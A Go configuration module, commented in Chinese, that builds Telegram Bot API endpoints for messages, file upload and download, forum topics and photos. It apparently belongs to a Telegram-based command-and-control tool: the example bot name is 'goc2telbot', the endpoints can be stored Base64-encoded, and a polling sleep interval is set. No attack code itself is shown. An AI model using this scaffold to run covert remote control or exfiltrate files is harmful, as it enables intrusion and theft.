package config

import (
	"encoding/base64"
	"fmt"
	"sync"
)

// 全局配置变量
var (
	// Telegram Bot配置 - 只需配置这三项即可
	// 配置方式1（推荐）：直接填写 BOT_TOKEN，所有 URL 会自动生成
	BOT_TOKEN = "" // 例如: "1234567890:ABCdefGhiJklMnoPqrsTuvWxyz"
	CHAT_ID   = "" // 例如: "-1002927089835"
	BOT_NAME  = "" // 例如: "goc2telbot" (不含@符号)

	// 配置方式2（向后兼容）：如果不填写 BOT_TOKEN，可以填写下面的 Base64 编码的 URL
	// 注意：如果 BOT_TOKEN 已设置，下面的变量将被忽略，所有 URL 会自动从 TOKEN 生成
	UPLOAD_FILE_URL      = "" // Base64 编码的 sendDocument URL
	UPDATE_URL           = "" // Base64 编码的 getUpdates URL
	SENDMSG_URL          = "" // Base64 编码的 sendMessage URL
	CREATEFORUMTOPIC_URL = "" // Base64 编码的 createForumTopic URL
	SEND_PHOTO_URL       = "" // Base64 编码的 sendPhoto URL
	GET_FILE_PATH_URL    = "" // Base64 编码的 getFile URL
	DOWNLOAD_FILE_URL    = "" // Base64 编码的文件下载基础 URL

	// 运行时配置
	OUTPUT_DIR = "output_dir"

	// 全局状态管理
	MessageThreadID      int64 = 0
	MessageThreadIDMutex sync.RWMutex

	SleepTime      uint64 = 5
	SleepTimeMutex sync.RWMutex
)

// getBaseURL 从 BOT_TOKEN 生成基础 API URL
func getBaseURL() string {
	if BOT_TOKEN != "" {
		return fmt.Sprintf("https://api.telegram.org/bot%s", BOT_TOKEN)
	}
	return ""
}

// getFileBaseURL 从 BOT_TOKEN 生成文件下载基础 URL
func getFileBaseURL() string {
	if BOT_TOKEN != "" {
		return fmt.Sprintf("https://api.telegram.org/file/bot%s", BOT_TOKEN)
	}
	return ""
}

// getURL 获取指定的 API URL
// 如果设置了 BOT_TOKEN，则自动生成；否则尝试从 Base64 编码的变量解码
func getURL(endpoint string) string {
	// 优先使用 BOT_TOKEN 自动生成
	if BOT_TOKEN != "" {
		if endpoint == "downloadFile" {
			return getFileBaseURL()
		}
		baseURL := getBaseURL()
		return baseURL + "/" + endpoint
	}

	// 向后兼容：从 Base64 编码的变量解码
	var encodedURL string
	switch endpoint {
	case "getUpdates":
		encodedURL = UPDATE_URL
	case "sendMessage":
		encodedURL = SENDMSG_URL
	case "sendDocument":
		encodedURL = UPLOAD_FILE_URL
	case "sendPhoto":
		encodedURL = SEND_PHOTO_URL
	case "createForumTopic":
		encodedURL = CREATEFORUMTOPIC_URL
	case "getFile":
		encodedURL = GET_FILE_PATH_URL
	case "downloadFile":
		encodedURL = DOWNLOAD_FILE_URL
	}

	if encodedURL == "" {
		return ""
	}

	decoded, err := base64.StdEncoding.DecodeString(encodedURL)
	if err != nil {
		// 如果解码失败，返回空字符串
		return ""
	}
	return string(decoded)
}

// DecodedURL 解码Base64编码的API URL（向后兼容函数）
// 现在推荐使用 getURL() 函数，它会自动从 BOT_TOKEN 生成
func DecodedURL(encodedURL string) string {
	if encodedURL == "" {
		return ""
	}

	decoded, err := base64.StdEncoding.DecodeString(encodedURL)
	if err != nil {
		// 如果解码失败，返回原字符串（用于调试）
		return encodedURL
	}
	return string(decoded)
}

// GetUpdateURL 获取 getUpdates API URL
func GetUpdateURL() string {
	return getURL("getUpdates")
}

// GetSendMessageURL 获取 sendMessage API URL
func GetSendMessageURL() string {
	return getURL("sendMessage")
}

// GetSendPhotoURL 获取 sendPhoto API URL
func GetSendPhotoURL() string {
	return getURL("sendPhoto")
}

// GetUploadFileURL 获取 sendDocument API URL
func GetUploadFileURL() string {
	return getURL("sendDocument")
}

// GetCreateForumTopicURL 获取 createForumTopic API URL
func GetCreateForumTopicURL() string {
	return getURL("createForumTopic")
}

// GetFilePathURL 获取 getFile API URL
func GetFilePathURL() string {
	return getURL("getFile")
}

// GetDownloadFileBaseURL 获取文件下载基础 URL
func GetDownloadFileBaseURL() string {
	return getURL("downloadFile")
}

// 获取和设置 MessageThreadID 的线程安全方法
func GetMessageThreadID() int64 {
	MessageThreadIDMutex.RLock()
	defer MessageThreadIDMutex.RUnlock()
	return MessageThreadID
}

func SetMessageThreadID(id int64) {
	MessageThreadIDMutex.Lock()
	defer MessageThreadIDMutex.Unlock()
	MessageThreadID = id
}

// 获取和设置 SleepTime 的线程安全方法
func GetSleepTime() uint64 {
	SleepTimeMutex.RLock()
	defer SleepTimeMutex.RUnlock()
	return SleepTime
}

func SetSleepTime(time uint64) {
	SleepTimeMutex.Lock()
	defer SleepTimeMutex.Unlock()
	SleepTime = time
}
